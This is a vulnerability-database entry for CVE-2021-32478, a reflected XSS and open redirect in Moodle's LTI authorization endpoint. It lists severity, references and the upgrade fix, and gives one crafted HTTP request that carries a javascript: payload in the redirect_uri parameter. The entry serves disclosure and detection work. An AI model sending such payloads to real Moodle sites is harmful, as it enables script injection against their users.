---
layout: "post"
cve_id: "CVE-2021-32478"
title: "Moodle 3.8-3.10.3 - Reflected XSS & Open Redirect"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-32478.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-32478.yaml"
author: "hackergautam"
severity: "medium"
impact: "Attackers can inject malicious JavaScript or redirect users to malicious sites via insufficient sanitization in the redirect_uri parameter.
"
remediation: "Upgrade to Moodle version 3.8.9, 3.9.7, or 3.10.4 or later.
"
reference:
  - "https://twitter.com/JacksonHHax/status/1391367064154042377"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-32478"
  - "https://moodle.org/mod/forum/discuss.php?d=422314"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 6.1, 'cve-id': 'CVE-2021-32478', 'cwe-id': 'CWE-79', 'epss-score': 0.03754, 'epss-percentile': 0.8768, 'cpe': 'cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'moodle', 'product': 'moodle'}"
tags:
  - "cve"
  - "cve2021"
  - "moodle"
  - "xss"
  - "intrusive"
  - "vuln"
  - "vkev"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Moodle versions 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8 contain a reflected XSS and open redirect caused by insufficient sanitization of the redirect URI in the LTI authorization endpoint, letting attackers execute scripts or redirect users maliciously, exploit requires crafted URL with malicious redirect URI.


## üåê HTTP Request
```nohighlight
GET /mod/lti/auth.php?redirect_uri=javascript:alert('38BuevPm2FlefH8ejED18i1tvMK') HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

